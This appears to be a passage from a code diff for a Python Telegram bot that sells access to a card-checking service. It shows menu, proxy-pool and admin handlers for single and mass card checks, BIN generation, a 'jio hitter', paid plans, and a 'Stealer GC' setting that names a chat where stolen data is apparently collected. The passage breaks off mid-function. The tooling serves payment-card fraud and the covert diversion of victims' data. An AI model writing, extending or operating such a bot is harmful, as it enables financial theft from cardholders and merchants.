+    rank = get_rank(charged)
+
+    text = pe(
+        f"[⌯] 𝗣𝗿𝗼𝗳𝗶𝗹𝗲 ⌁ 𝚄𝚜𝚎𝚛 𝙸𝚗𝚏𝚘 ⌁ 👑\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗡𝗮𝗺𝗲 ⌁ › {name} ‹\n"
+        f"[⌯] 𝗛𝗮𝗻𝗱𝗹𝗲 ⌁ {handle} ⌁ 📛\n"
+        f"[⌯] 𝗜𝗗 ⌁ {uid} ⌁ 🆔\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗥𝗼𝗹𝗲 ⌁ {role} ⌁ 🎭\n"
+        f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ {plan_status} ⌁ 💠\n"
+        f"[⌯] 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ⌁ {expires} ⌁ ⏳\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⌁ {proxy_status} ⌁ 🔌\n"
+        f"[⌯] 𝗥𝗮𝗻𝗸 ⌁ {rank} 🏆\n"
+        f"[⌯] 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ {charged} ⌁ 💎\n"
+        f"[⌯] 𝗥𝗲𝗱𝗲𝗲𝗺 ⌁ /redeem KEY ⌁ 🔑\n"
+        f"[⌯] 𝗣𝗹𝗮𝗻𝘀 ⌁ /plans ⌁ ⭐"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_profile())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ COMMANDS
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"^commands$"))
+async def cb_commands(event):
+    await event.answer()
+    text = pe(
+        f"[⌯] 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 ⌁ 𝚁𝚎𝚏𝚎𝚛𝚎𝚗𝚌𝚎 ⌁ 📖\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ ⚡\n"
+        f"[⌯] /sh ⌁ 𝚜𝚒𝚗𝚐𝚕𝚎 𝚌𝚑𝚎𝚌𝚔 ⌁ 💳\n"
+        f"[⌯] /msh ⌁ 𝚖𝚊𝚜𝚜 𝚌𝚑𝚎𝚌𝚔 ⌁ 🔥\n"
+        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝘀 ⌁ 𝚄𝚗𝚕𝚒𝚖𝚒𝚝𝚎𝚍 ⌁ ♾️\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 🔌\n"
+        f"[⌯] /setproxy ⌁ 𝚊𝚍𝚍 𝚙𝚛𝚘𝚡𝚢 ⌁ 🛠️\n"
+        f"[⌯] /chkproxy ⌁ 𝚝𝚎𝚜𝚝 𝚙𝚛𝚘𝚡𝚢 ⌁ ✅\n"
+        f"[⌯] /clearuserproxy ⌁ 𝚛𝚎𝚖𝚘𝚟𝚎 ⌁ 🗑️\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗠𝘆 𝗦𝗶𝘁𝗲𝘀 ⌁ 🌐\n"
+        f"[⌯] /mysites ⌁ 𝚟𝚒𝚎𝚠 𝚜𝚒𝚝𝚎𝚜 ⌁ 📋\n"
+        f"[⌯] /setmysites ⌁ 𝚊𝚍𝚍 𝚜𝚒𝚝𝚎𝚜 ⌁ ➕\n"
+        f"[⌯] /clearmysites ⌁ 𝚛𝚎𝚖𝚘𝚟𝚎 ⌁ 🗑️\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ 💎\n"
+        f"[⌯] /myplan ⌁ 𝚌𝚑𝚎𝚌𝚔 𝚙𝚕𝚊𝚗 ⌁ 📊\n"
+        f"[⌯] /redeem ⌁ 𝚛𝚎𝚍𝚎𝚎𝚖 𝚔𝚎𝚢 ⌁ 🔑\n"
+        f"[⌯] /plans ⌁ 𝚟𝚒𝚎𝚠 𝚙𝚕𝚊𝚗𝚜 ⌁ ⭐\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗧𝗼𝗼𝗹𝘀 ⌁ ⚙️\n"
+        f"[⌯] /bin ⌁ 𝙱𝙸𝙽 𝚕𝚘𝚘𝚔𝚞𝚙 ⌁ 🔍\n"
+        f"[⌯] /genbin ⌁ 𝚐𝚎𝚗𝚎𝚛𝚊𝚝𝚎 ⌁ 🎴\n"
+        f"[⌯] /split ⌁ 𝚜𝚙𝚕𝚒𝚝 𝚏𝚒𝚕𝚎 ⌁ 📂\n"
+        f"[⌯] /jio ⌁ 𝚓𝚒𝚘 𝚑𝚒𝚝𝚝𝚎𝚛 ⌁ 📱"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_commands())
+
+
+
+@bot.on(events.CallbackQuery(pattern=b"manage_proxy"))
+async def cb_manage_proxy(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.answer("❌ Access required!", alert=True)
+        return
+    await event.answer()
+    user_list = get_user_proxy_list(uid)
+    pool = load_proxies()
+    proxy_status = f"{len(user_list)} set" if user_list else "Not set"
+
+    text = pe(
+        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜 ⌁ 🔌\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝘆 ⌁ {proxy_status} ⌁ 🔐\n"
+        f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {len(pool)} 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 ⌁ 📡\n"
+        f"[⌯] 𝗪𝗼𝗿𝗸𝗲𝗿𝘀 ⌁ {MASS_WORKERS} 𝚠𝚘𝚛𝚔𝚎𝚛𝚜 ⌁ ⚙️\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗦𝗲𝘁 ⌁ /setproxy ip:port ⌁ 🌐\n"
+        f"[⌯] 𝗔𝘂𝘁𝗵 ⌁ /setproxy ip:port:user:pass ⌁ 🔑\n"
+        f"[⌯] 𝗨𝗿𝗹 ⌁ /setproxy http://user:pass@ip:port ⌁ 🔗\n"
+        f"[⌯] 𝗦𝗢𝗖𝗞𝗦𝟱 ⌁ /setproxy socks5://user:pass@ip:port ⌁ 🧦\n"
+        f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ 𝚂𝚎𝚗𝚍 .𝚝𝚡𝚝 𝚠𝚒𝚝𝚑 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 ⌁ 📁\n"
+        f"[⌯] 𝗖𝗹𝗲𝗮𝗿 ⌁ /clearuserproxy ⌁ 🗑️"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ TOGGLE POOL
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"toggle_pool"))
+async def cb_toggle_pool(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.answer("❌ Access required!", alert=True)
+        return
+    current = user_pool_enabled.get(uid, True)
+    user_pool_enabled[uid] = not current
+    save_user_pool()
+    state = "ON" if not current else "OFF"
+    await event.answer(f"Pool: {state}", alert=False)
+
+    user_list = get_user_proxy_list(uid)
+    pool = load_proxies()
+    proxy_status = f"{len(user_list)} set" if user_list else "Not set"
+
+    text = pe(
+        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜 ⌁ 🔌\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝘆 ⌁ {proxy_status} ⌁ 🔐\n"
+        f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {len(pool)} 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 ⌁ 📡\n"
+        f"[⌯] 𝗪𝗼𝗿𝗸𝗲𝗿𝘀 ⌁ {MASS_WORKERS} 𝚠𝚘𝚛𝚔𝚎𝚛𝚜 ⌁ ⚙️\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗦𝗲𝘁 ⌁ /setproxy ip:port ⌁ 🌐\n"
+        f"[⌯] 𝗔𝘂𝘁𝗵 ⌁ /setproxy ip:port:user:pass ⌁ 🔑\n"
+        f"[⌯] 𝗨𝗿𝗹 ⌁ /setproxy http://user:pass@ip:port ⌁ 🔗\n"
+        f"[⌯] 𝗦𝗢𝗖𝗞𝗦𝟱 ⌁ /setproxy socks5://user:pass@ip:port ⌁ 🧦\n"
+        f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ 𝚂𝚎𝚗𝚍 .𝚝𝚡𝚝 𝚠𝚒𝚝𝚑 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 ⌁ 📁\n"
+        f"[⌯] 𝗖𝗹𝗲𝗮𝗿 ⌁ /clearuserproxy ⌁ 🗑️"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ TEST PROXY
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"test_proxy_btn"))
+async def cb_test_proxy_btn(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.answer("❌ Access required!", alert=True)
+        return
+    user_list = get_user_proxy_list(uid)
+    if not user_list:
+        await event.answer("❌ No proxy set. Use /setproxy first.", alert=True)
+        return
+    proxy = user_list[0]
+    await event.answer("⏳ Testing...", alert=False)
+    result = await test_proxy(proxy)
+    if result['status'] == 'alive':
+        ip_info = await get_proxy_ip(proxy)
+        await event.answer(f"✅ Alive — {ip_info or 'N/A'}", alert=True)
+    else:
+        await event.answer("❌ Proxy Dead", alert=True)
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ REMOVE PROXY
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"remove_proxy_btn"))
+async def cb_remove_proxy_btn(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.answer("❌ Access required!", alert=True)
+        return
+    remove_user_proxy(uid)
+    await event.answer("✅ Proxy removed!", alert=True)
+
+    user_list = get_user_proxy_list(uid)
+    pool = load_proxies()
+    proxy_status = f"{len(user_list)} set" if user_list else "Not set"
+
+    text = pe(
+        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 𝚂𝚎𝚝𝚝𝚒𝗻𝗴𝘀 ⌁ 🔌\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝘆 ⌁ {proxy_status} ⌁ 🔐\n"
+        f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {len(pool)} 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 ⌁ 📡\n"
+        f"[⌯] 𝗪𝗼𝗿𝗸𝗲𝗿𝘀 ⌁ {MASS_WORKERS} 𝚠𝚘𝚛𝚔𝚎𝚛𝚜 ⌁ ⚙️\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗦𝗲𝘁 ⌁ /setproxy ip:port ⌁ 🌐\n"
+        f"[⌯] 𝗔𝘂𝘁𝗵 ⌁ /setproxy ip:port:user:pass ⌁ 🔑\n"
+        f"[⌯] 𝗨𝗿𝗹 ⌁ /setproxy http://user:pass@ip:port ⌁ 🔗\n"
+        f"[⌯] 𝗦𝗢𝗖𝗞𝗦𝟱 ⌁ /setproxy socks5://user:pass@ip:port ⌁ 🧦\n"
+        f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ 𝚂𝚎𝚗𝚍 .𝚝𝚡𝚝 𝚠𝚒𝚝𝚑 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 ⌁ 📁\n"
+        f"[⌯] 𝗖𝗹𝗲𝗮𝗿 ⌁ /clearuserproxy ⌁ 🗑️"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ REDEEM INFO
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"redeem_info"))
+async def cb_redeem_info(event):
+    await event.answer()
+    text = pe(
+        f"[⌯] 𝗥𝗲𝗱𝗲𝗲𝗺 ⌁ 𝙺𝚎𝚢 𝙰𝚌𝚝𝚒𝚟𝚊𝚝𝚒𝚘𝚗 ⌁ 🔑\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗨𝘀𝗮𝗴𝗲 ⌁ /redeem KEY ⌁ ⌨️\n"
+        f"[⌯] 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 ⌁ @{OWNER_USERNAME} ⌁ 💬"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_redeem_info())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ ADMIN PANEL
+# ══════════════════════════════════════════════════════════════════════════════
+def _admin_panel_text():
+    pcount = len(load_premium_users())
+    scount = len(load_sites())
+    prcount = len(load_proxies())
+    stealer = load_stealer_gc() or "Not Set"
+    return pe(
+        f"[⌯] 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 ⌁ 𝙳𝚊𝚜𝚑𝚋𝚘𝚊𝚛𝚍 ⌁ 👑\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ 𝙾𝚗𝚕𝚒𝚗𝚎 ⌁ 🟢\n"
+        f"[⌯] 𝗨𝘀𝗲𝗿𝘀 ⌁ {pcount} ⌁ 👥\n"
+        f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {scount} 𝚊𝚌𝚝𝚒𝚟𝚎 ⌁ 🌐\n"
+        f"[⌯] 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⌁ {prcount} ⌁ 📡\n"
+        f"[⌯] 𝗦𝘁𝗲𝗮𝗹𝗲𝗿 𝗚𝗖 ⌁ {stealer} ⌁ 🕵️"
+    )
+
+
+@bot.on(events.NewMessage(pattern=r'^/admin$'))
+async def admin_panel_cmd(event):
+    uid = event.sender_id
+    if not is_admin(uid):
+        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n{SEP}\n❌ Admin only!"), parse_mode='html')
+        return
+    await raw_send(uid, _admin_panel_text(), rows_admin())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_panel"))
+async def cb_admin_panel(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    await nav_edit(event.chat_id, event.message_id, _admin_panel_text(), rows_admin())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ ADMIN: ADD / REMOVE ADMIN
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/addadmin(\s|$)'))
+async def add_admin_command(event):
+    if not is_admin(event.sender_id):
+        await event.reply(pe(f"❌ Admin only"), parse_mode='html')
+        return
+    
+    parts = event.message.text.split()
+    if len(parts) < 2:
+        await event.reply(pe(
+            f"[⌯] 𝗔𝗱𝗱 𝗔𝗱𝗺𝗶𝗻 ⌁ ➕\n{SEP}\n"
+            f"[⌯] Usage ⌁ /addadmin chat_id\n"
+            f"[⌯] Usage ⌁ /addadmin @username"
+        ), parse_mode='html')
+        return
+    
+    target = parts[1].strip()
+    target_id = None
+    
+    try:
+        target_id = int(target)
+    except ValueError:
+        if target.startswith('@'):
+            try:
+                entity = await bot.get_entity(target)
+                target_id = entity.id
+            except Exception as e:
+                await event.reply(pe(f"❌ Could not find user: <code>{e}</code>"), parse_mode='html')
+                return
+        else:
+            await event.reply(pe(f"❌ Invalid format. Use ID or @username"), parse_mode='html')
+            return
+    
+    if not target_id:
+        await event.reply(pe(f"❌ Could not resolve user."), parse_mode='html')
+        return
+    
+    if target_id in ADMIN_IDS:
+        await event.reply(pe(f"⚠️ User is already an admin."), parse_mode='html')
+        return
+    
+    ADMIN_IDS.add(target_id)
+    _save_admin_ids(ADMIN_IDS)
+    
+    await event.reply(pe(
+        f"[⌯] 𝗔𝗱𝗺𝗶𝗻 ⌁ 𝙰𝚍𝚍𝚎𝚍 ⌁ 🔥\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗨𝘀𝗲𝗿 𝗜𝗗 ⌁ {target_id} ⌁ ✅\n"
+        f"[⌯] 𝗥𝗼𝗹𝗲 ⌁ 𝙰𝚍𝚖𝚒𝚗 ⌁ ⚡"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/rmadmin(\s|$)'))
+async def remove_admin_command(event):
+    if not is_admin(event.sender_id):
+        await event.reply(pe(f"❌ Admin only"), parse_mode='html')
+        return
+    
+    parts = event.message.text.split()
+    if len(parts) < 2:
+        await event.reply(pe(f"❌ Usage: /rmadmin chat_id"), parse_mode='html')
+        return
+    
+    try:
+        target_id = int(parts[1].strip())
+    except:
+        await event.reply(pe(f"❌ Invalid ID"), parse_mode='html')
+        return
+    
+    if target_id == OWNER_ID:
+        await event.reply(pe(f"❌ Cannot remove owner!"), parse_mode='html')
+        return
+    
+    if target_id not in ADMIN_IDS:
+        await event.reply(pe(f"⚠️ User is not an admin."), parse_mode='html')
+        return
+    
+    ADMIN_IDS.discard(target_id)
+    _save_admin_ids(ADMIN_IDS)
+    
+    await event.reply(pe(
+        f"[⌯] 𝗔𝗱𝗺𝗶𝗻 ⌁ 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ⌁ ❌\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗨𝘀𝗲𝗿 𝗜𝗗 ⌁ {target_id}\n"
+        f"[⌯] 𝗥𝗼𝗹𝗲 ⌁ 𝙼𝚎𝚖𝚋𝚎𝚛 ⌁ ⚡"
+    ), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ ADMIN ▸ STEALER GC SETUP
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/setstealer(\s|$)'))
+async def set_stealer_command(event):
+    if not is_admin(event.sender_id):
+        await event.reply(pe(f"❌ Admin only"), parse_mode='html')
+        return
+    
+    parts = event.message.text.split()
+    if len(parts) < 2:
+        current = load_stealer_gc()
+        await event.reply(pe(
+            f"[⌯] 𝗦𝘁𝗲𝗮𝗹𝗲𝗿 𝗚𝗖 ⌁ 🕵️\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ⌁ {current or 'Not Set'}\n"
+            f"{SEP}\n"
+            f"[⌯] /setstealer ⌁ <chat_id> ⌁ ✅\n"
+            f"[⌯] /setstealer ⌁ off ⌁ ❌"
+        ), parse_mode='html')
+        return
+    
+    value = parts[1].strip()
+    if value.lower() in ('off', 'none', '0'):
+        set_stealer_gc(0)
+        await event.reply(pe(f"✅ Stealer GC disabled."), parse_mode='html')
+        return
+    
+    try:
+        chat_id = int(value)
+    except:
+        # Try to resolve username
+        try:
+            entity = await bot.get_entity(value)
+            chat_id = entity.id
+        except Exception as e:
+            await event.reply(pe(f"❌ Invalid chat ID or username: <code>{e}</code>"), parse_mode='html')
+            return
+    
+    set_stealer_gc(chat_id)
+    await event.reply(pe(
+        f"[⌯] 𝗦𝘁𝗲𝗮𝗹𝗲𝗿 𝗚𝗖 ⌁ 𝗦𝗲𝘁 ⌁ ✅\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗖𝗵𝗮𝘁 𝗜𝗗 ⌁ <code>{chat_id}</code>"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/stealerinfo$'))
+async def stealer_info_command(event):
+    if not is_admin(event.sender_id):
+        return
+    current = load_stealer_gc()
+    await event.reply(pe(
+        f"[⌯] 𝗦𝘁𝗲𝗮𝗹𝗲𝗿 𝗚𝗖 ⌁ 🕵️\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗖𝗵𝗮𝘁 𝗜𝗗 ⌁ {current or 'Not Set'}"
+    ), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ ADMIN ▸ USERS
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"admin_users"))
+async def cb_admin_users(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    text = pe(
+        f"[⌯] 𝗨𝘀𝗲𝗿 𝗠𝗴𝗺𝘁 ⌁ {len(load_premium_users())} 𝚊𝚌𝚝𝚒𝚟𝚎 ⌁ 👥\n"
+        f"{SEP}\n"
+        f"[⌯] /grant ⌁ uid days ⌁ ✅\n"
+        f"[⌯] /auth ⌁ uid days ⌁ 🔐\n"
+        f"[⌯] /revoke ⌁ uid ⌁ ❌\n"
+        f"{SEP}\n"
+        f"[⌯] /addpremium ⌁ uid ⌁ ➕\n"
+        f"[⌯] /rmpremium ⌁ uid ⌁ ➖\n"
+        f"[⌯] /ban ⌁ uid ⌁ 🚫\n"
+        f"[⌯] /unban ⌁ uid ⌁ 🔓"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_list_users"))
+async def cb_admin_list_users(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    users = load_premium_users()
+    if not users:
+        await event.answer("📋 No users yet.", alert=True)
+        return
+    lines = []
+    for i, u in enumerate(users[:50]):
+        try:
+            uid_int = int(u)
+            p = get_plan_info(uid_int)
+            source = p.get("source", "key") if p else "key"
+            exp = format_expiry(uid_int) if p else "—"
+            lines.append(f"[⌯] {i+1} ⌁ {u} ⌁ {source} ⌁ {exp}")
+        except:
+            lines.append(f"[⌯] {i+1} ⌁ {u}")
+    more = f"\n...and {len(users)-50} more" if len(users) > 50 else ""
+    text = pe(f"[⌯] 𝗨𝘀𝗲𝗿𝘀 ⌁ {len(users)} ⌁ 👥\n\n{SEP}\n" + "\n".join(lines) + more)
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_add_user_info"))
+async def cb_admin_add_user_info(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    text = pe(
+        f"[⌯] 𝗔𝗱𝗱 𝗨𝘀𝗲𝗿 ⌁ ➕\n{SEP}\n"
+        f"[⌯] /addpremium ⌁ uid ⌁ 👤\n"
+        f"[⌯] /grant ⌁ uid days ⌁ ✅"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_rm_user_info"))
+async def cb_admin_rm_user_info(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    text = pe(
+        f"[⌯] 𝗥𝗲𝗺𝗼𝘃𝗲 𝗨𝘀𝗲𝗿 ⌁ ➖\n{SEP}\n"
+        f"[⌯] /rmpremium ⌁ uid ⌁ 🗑️\n"
+        f"[⌯] /revoke ⌁ uid ⌁ ❌"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_banned_list"))
+async def cb_admin_banned_list(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    banned = load_banned_users()
+    if not banned:
+        await event.answer("🚫 No banned users.", alert=True)
+        return
+    lines = "\n".join([f"[⌯] {i+1} ⌁ {u}" for i, u in enumerate(banned[:50])])
+    text = pe(f"[⌯] 𝗕𝗮𝗻𝗻𝗲𝗱 ⌁ {len(banned)} ⌁ 🚫\n\n{SEP}\n{lines}")
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ ADMIN ▸ SITES
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"admin_sites"))
+async def cb_admin_sites(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    scount = len(load_sites())
+    text = pe(
+        f"[⌯] 𝗦𝗶𝘁𝗲 𝗠𝗴𝗺𝘁 ⌁ {scount} 𝚝𝚘𝚝𝚊𝚕 ⌁ 🌐\n"
+        f"\n{SEP}\n"
+        f"[⌯] 𝗔𝗰𝘁𝗶𝘃𝗲 ⌁ {scount} ⌁ 🟢\n"
+        f"[⌯] 𝗦𝗹𝗲𝗲𝗽𝗶𝗻𝗴 ⌁ 0 ⌁ 💤\n"
+        f"\n{SEP}\n"
+        f"[⌯] /addsite ⌁ [url] ⌁ ➕\n"
+        f"[⌯] /rmsite ⌁ [url] ⌁ ➖\n"
+        f"[⌯] /sites ⌁ 𝚅𝚒𝚎𝚠 𝚊𝚕𝚕 ⌁ 📋\n"
+        f"[⌯] /checksites ⌁ 𝙷𝚎𝚊𝚕𝚝𝚑 𝚌𝚑𝚎𝚌𝚔 ⌁ 🔍"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_sites())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_list_sites_cb"))
+async def cb_admin_list_sites(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    sites = load_sites()
+    if not sites:
+        await event.answer("🌐 No sites yet.", alert=True)
+        return
+    lines = "\n".join([s.replace("https://", "").replace("http://", "") for s in sites[:30]])
+    more = f"\n...and {len(sites)-30} more." if len(sites) > 30 else ""
+    text = pe(f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {len(sites)} ⌁ 🌐\n\n{SEP}\n{lines}{more}")
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_sites())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_add_site_info"))
+async def cb_admin_add_site_info(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    text = pe(f"[⌯] 𝗔𝗱𝗱 𝗦𝗶𝘁𝗲 ⌁ ➕\n{SEP}\n[⌯] /addsite https://example.com ⌁ 🌐")
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_sites())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_rm_site_info"))
+async def cb_admin_rm_site_info(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    text = pe(f"[⌯] 𝗥𝗲𝗺𝗼𝘃𝗲 𝗦𝗶𝘁𝗲 ⌁ ➖\n{SEP}\n[⌯] /rmsite https://example.com ⌁ 🗑️")
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_sites())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ ADMIN ▸ PROXY POOL
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"admin_proxy_pool"))
+async def cb_admin_proxy_pool(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    proxies = load_proxies()
+    sample = proxies[0] if proxies else "—"
+    text = pe(
+        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 𝗣𝗼𝗼𝗹 ⌁ {len(proxies)} 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 ⌁ 📡\n"
+        f"\n{SEP}\n"
+        f"[⌯] 𝗦𝗮𝗺𝗽𝗹𝗲 ⌁ {sample}\n"
+        f"\n{SEP}\n"
+        f"[⌯] /addproxy ⌁ [𝚙𝚛𝚘𝚡𝚢] ⌁ ➕\n"
+        f"[⌯] /rmproxy ⌁ [𝚙𝚛𝚘𝚡𝚢] ⌁ ➖\n"
+        f"[⌯] /clearproxy ⌁ 𝙲𝚕𝚎𝚊𝚛 𝚊𝚕𝚕 ⌁ 🧹\n"
+        f"[⌯] /getproxy ⌁ 𝙶𝚎𝚝 𝚙𝚘𝚘𝚕 ⌁ 📥\n"
+        f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ 𝚂𝚎𝚗𝚍 .𝚝𝚡𝚝 𝚠𝚒𝚝𝚑 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 ⌁ 📁"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_list_proxy_cb"))
+async def cb_admin_list_proxy(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    proxies = load_proxies()
+    if not proxies:
+        await event.answer("📡 No proxies yet.", alert=True)
+        return
+    lines = "\n".join(proxies[:20])
+    more = f"\n...and {len(proxies)-20} more." if len(proxies) > 20 else ""
+    text = pe(f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {len(proxies)} 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 ⌁ 📡\n\n{SEP}\n{lines}{more}")
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_add_proxy_info"))
+async def cb_admin_add_proxy_info(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    text = pe(
